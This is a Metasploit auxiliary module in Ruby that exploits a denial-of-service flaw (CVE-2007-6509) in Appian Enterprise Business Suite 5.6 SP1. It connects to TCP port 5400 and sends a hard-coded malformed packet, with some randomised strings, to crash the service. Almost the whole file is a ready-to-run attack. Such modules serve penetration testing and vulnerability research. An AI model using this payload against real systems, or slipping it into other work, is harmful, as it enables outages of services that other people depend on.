##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Appian Enterprise Business Suite 5.6 SP1 DoS',
      'Description'    => %q{
        This module exploits a denial of service flaw in the Appian
        Enterprise Business Suite service.
      },

      'Author'         => [ 'guiness.stout <guinness.stout[at]gmail.com>' ],
      'License'        => BSD_LICENSE,
      'References'     =>
        [
          ['CVE', '2007-6509'],
          ['OSVDB', '39500'],
          ['URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2007-12/0440.html']
        ],
      'DisclosureDate' => 'Dec 17 2007'
    ))

    register_options([Opt::RPORT(5400),], self.class)
  end

  def run
    print_status('Connecting to the service...')
    connect

    # mod: randomize the static "saint" strings from the PoC - hdm

    req =
      "\x02\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00" +
      Rex::Text.rand_text_alpha(2) +
      "\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x31\x35\x39\x36\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x04\x03\x01\x06\x0a\x09\x01\x01\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00" +
      Rex::Text.rand_text_alpha(5) +
      "\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x05" +
      Rex::Text.rand_text_alpha(5) +
      "\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x0a\x05\x00\x00\x00\x43\x54\x2d\x4c\x69\x62\x72\x61\x72\x79"+
      "\x0a\x05\x00\x00\x00\x00\x0d\x11\x00\x73\x5f\x65\x6e\x67\x6c\x69"+
      "\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x02\x01\x00\x61\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x69\x73\x6f"+
      "\x5f\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x35\x31\x32"+
      "\x00\x00\x00\x03\x00\x00\x00\x00\xe2\x16\x00\x01\x09\x06\x08\x33"+
      "\x6d\x7f\xff\xff\xff\xfe\x02\x09\x00\x00\x00\x00\x0a\x68\x00\x00"+
      "\x00"

    print_status('Sending exploit...')
    sock.put(req)

    disconnect
  end

end
